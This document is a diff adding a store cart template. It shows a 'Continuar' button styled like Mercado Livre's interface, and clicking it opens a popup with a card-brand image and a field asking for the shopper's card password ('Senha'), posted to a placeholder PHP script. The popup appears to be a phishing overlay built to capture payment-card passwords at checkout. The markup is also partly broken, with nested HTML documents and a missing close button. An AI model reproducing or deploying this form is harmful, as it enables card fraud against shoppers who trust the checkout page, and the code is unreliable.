@@ -1,0 +1,161 @@
+{% assign hasProductType = false %}
+{% for line_item in cart.items %}
+  {% if line_item.product.type != blank %}
+    {% assign hasProductType = true %}
+    {% break %}
+  {% endif %}
+{% endfor %}
+
+{% if hasProductType %}
+
+
+
+
+
+  
+{% else %}
+
+
+
+
+<button id="open-popup" type="button" class="andes-button bf-ui-button andes-button--large andes-button--loud"><span class="andes-button__content"><span class="andes-button__text">Continuar</span></span></button>
+
+
+
+{% endif %}
+
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 99999999;
+        }
+
+        .popup-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #000;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    
+    <div id="popup" class="popup">
+        <div class="popup-content">
+
+
+          
+         <!---------->
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* Estilos CSS para o formulário */
+        .custom-body {
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .card-image {
+            max-width: 100px;
+        }
+
+        .form-container {
+            display: inline-block;
+            text-align: left;
+        }
+
+        .password-input {
+            padding: 10px;
+            width: 200px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+        }
+
+        .submit-button {
+            padding: 10px 20px;
+            background-color: #0074cc;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body class="custom-body">
+    <div class="container">
+        <img class="card-image" src="caminho_da_sua_imagem_da_bandeira.jpg" alt="Bandeira de Cartão">
+        <form action="seu_script_de_processamento.php" method="post" class="form-container">
+           <br>    
+          <br> 
+          <label for="senha">Senha:</label>
+            <input type="password" id="senha" name="senha" class="password-input" required>
+            <input type="submit" value="Enviar" class="submit-button">
+        </form>
+    </div>
+</body>
+</html>
+
+
+
+
+          <!--------->
+       
+        
+        
+        </div>
+    </div>
+    <script>
+        const openPopupButton = document.getElementById("open-popup");
+        const closePopupButton = document.getElementById("close-popup");
+        const popup = document.getElementById("popup");
+
+        openPopupButton.addEventListener("click", () => {
+            popup.style.display = "block";
+        });
+
+        closePopupButton.addEventListener("click", () => {
+            popup.style.display = "none";
+        });
+
+        // Fechar o pop-up quando o usuário clicar fora do conteúdo do pop-up
+        window.addEventListener("click", (event) => {
+            if (event.target === popup) {
+                popup.style.display = "none";
+            }
+        });
+    </script>
+</body>
+</html>
+
